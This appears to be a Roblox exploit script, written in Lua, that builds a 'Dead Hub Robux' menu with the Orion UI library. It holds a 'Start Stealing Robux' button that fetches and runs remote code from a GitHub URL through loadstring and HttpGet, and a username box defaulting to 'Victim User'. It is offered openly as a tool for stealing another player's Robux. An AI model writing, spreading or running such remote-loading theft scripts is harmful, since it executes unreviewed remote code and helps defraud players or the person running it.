local player = game.Players.LocalPlayer

 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Dead Hub Robux", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = "Dead Hub Robux",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = "🤑🤑🤑"
})

--[[
Name = <string> - The name of the section.
]]

OrionLib:MakeNotification({
	Name = "Script Loaded",
	Content = "Enjoy",
	Image = "rbxassetid://4483345998",
	Time = 5
})

Tab:AddButton({
	Name = "Start Stealing Robux",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/EXD2K12/DeadHubRobux/refs/heads/main/PlsDonate.lua'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddTextbox({
	Name = "Username --->",
	Default = "Victim User",
	TextDisappear = false,
	Callback = function(Value)
		print(Value)
	end	  
})
